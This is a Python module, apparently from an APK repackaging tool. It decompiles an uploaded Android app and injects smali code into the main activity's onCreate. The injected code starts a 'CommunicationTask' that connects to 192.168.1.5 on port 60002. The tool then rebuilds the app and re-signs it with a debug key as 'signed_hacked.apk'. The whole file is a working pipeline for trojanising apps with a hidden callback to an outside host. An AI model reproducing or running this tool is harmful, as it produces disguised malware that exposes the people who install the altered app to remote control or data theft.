import os
import shutil
import subprocess
import zipfile
from distutils.dir_util import copy_tree
from ..utils import filesystem
from bs4 import BeautifulSoup as bs


PUBLIC_ON_CREATE = ".method public onCreate(Landroid/os/Bundle;)V"
PROTECTED_ON_CREATE = ".method protected onCreate(Landroid/os/Bundle;)V"
PRIVATE_ON_CREATE = ".method private onCreate(Landroid/os/Bundle;)V"


def disas(file_name):
    if f'tmp_{file_name}' in os.listdir(os.getcwd() + f'/upload_dir'):
        shutil.rmtree(os.getcwd() + f'/upload_dir/tmp_{file_name}')
    else:
        os.mkdir(os.getcwd() + f'/upload_dir/tmp_{file_name}')

    subprocess.call(['java', '-jar', 'javalib/apktool_2.5.0.jar', 'd', f'upload_dir/{file_name}.apk', '-o', f'upload_dir/tmp_{file_name}', '-f'])


def get_custom_pezzotto(main_activity_escaped: str) -> str:
    return """
    invoke-static {}, Lcom/example/a2_faces_trial/TaskRunner;->getInstance()Lcom/example/a2_faces_trial/TaskRunner;
    
    move-result-object v2
    
    new-instance v3, Lcom/example/a2_faces_trial/CommunicationTask;
    
    invoke-virtual {p0}, L""" + main_activity_escaped + """;->getApplicationContext()Landroid/content/Context;
    
    move-result-object v4
    
    const-string v5, "192.168.1.5"
    
    const v6, 0xea62
    
    invoke-direct {v3, v4, v5, v6}, Lcom/example/a2_faces_trial/CommunicationTask;-><init>(Landroid/content/Context;Ljava/lang/String;I)V
    
    invoke-virtual {v2, v3}, Lcom/example/a2_faces_trial/TaskRunner;->execute(Ljava/lang/Runnable;)V
    """


def add_pezzotto(file_name):
    base_folder = os.getcwd() + f'/upload_dir/tmp_{file_name}'

    with zipfile.ZipFile(os.getcwd() + "/android_includes.zip", 'r') as zip_ref:
        zip_ref.extractall(base_folder, )

    copy_tree(base_folder + '/com', base_folder + "/smali/com")
    copy_tree(base_folder + '/javassist', base_folder + "/smali/javassist")

    shutil.rmtree(base_folder + '/com')
    shutil.rmtree(base_folder + '/javassist')

    main_activity_name = str(find_main_activity(base_folder + "/AndroidManifest.xml"))
    main_activity_escaped = main_activity_name.replace(".", "/")

    main_activity_path = ""
    folders = os.listdir(base_folder)
    for folder in folders:
        if os.path.isfile(base_folder + "/" + folder + f'/{main_activity_escaped}.smali'):
            print("Hello main activity", folder)
            main_activity_path = base_folder + "/" + folder + f'/{main_activity_escaped}.smali'
            break

    m_file = open(main_activity_path, "r")
    main_activity_content = m_file.read()
    m_file.close()

    i = 0
    if PUBLIC_ON_CREATE in main_activity_content:
        i = main_activity_content.index(PUBLIC_ON_CREATE) + len(
            PUBLIC_ON_CREATE)
    elif PROTECTED_ON_CREATE in main_activity_content:
        i = main_activity_content.index(PROTECTED_ON_CREATE) + len(
            PROTECTED_ON_CREATE)
    elif PRIVATE_ON_CREATE in main_activity_content:
        i = main_activity_content.index(PRIVATE_ON_CREATE) + len(
            PRIVATE_ON_CREATE)

    before = main_activity_content[0:i]
    after = main_activity_content[i:]

    i2 = after.index(".end method") - len("return-void") - 2
    after1 = after[0:i2]
    after2 = after[i2:]

    main_activity_content = before + after1 + get_custom_pezzotto(main_activity_escaped) + after2

    m_file = open(main_activity_path, "w")
    m_file.write(main_activity_content)
    m_file.close()


def reassemble(file_name):
    subprocess.call(['java', '-jar', 'javalib/apktool_2.5.0.jar', 'b', f'upload_dir/tmp_{file_name}', '-o', f'upload_dir/tmp_{file_name}/hacked.apk', '-f'])


def sign(file_name):
    subprocess.call(
        ['java', '-jar', 'javalib/apksigner.jar', 'sign', '--ks', 'javalib/debug.keystore', '--ks-key-alias', 'androiddebugkey', '--ks-pass',
         'pass:android', '--out', f'upload_dir/tmp_{file_name}/signed_hacked.apk', f'upload_dir/tmp_{file_name}/hacked.apk'])

    new_file = open(f'upload_dir/tmp_{file_name}/signed_hacked.apk', 'rb')

    md5, sha1, size = filesystem.eval_hash_and_size(new_file)
    shutil.copy(f'upload_dir/tmp_{file_name}/signed_hacked.apk', f'upload_dir/{sha1}.apk')

    return md5, sha1, size


def find_main_activity(manifest_path):
    manifest = open(manifest_path, 'r')
    manifest_parsed = bs(manifest, "lxml")
    activities = manifest_parsed.find_all("activity")

    for activity in activities:
        intents = activity.find_all('intent-filter')
        for intent in intents:
            action = intent.find('action')
            diz_attrs = dict(action.attrs)

            if 'android:name' in diz_attrs and diz_attrs['android:name'] == 'android.intent.action.MAIN':
                print(activity.attrs['android:name'])
                return activity.attrs['android:name']
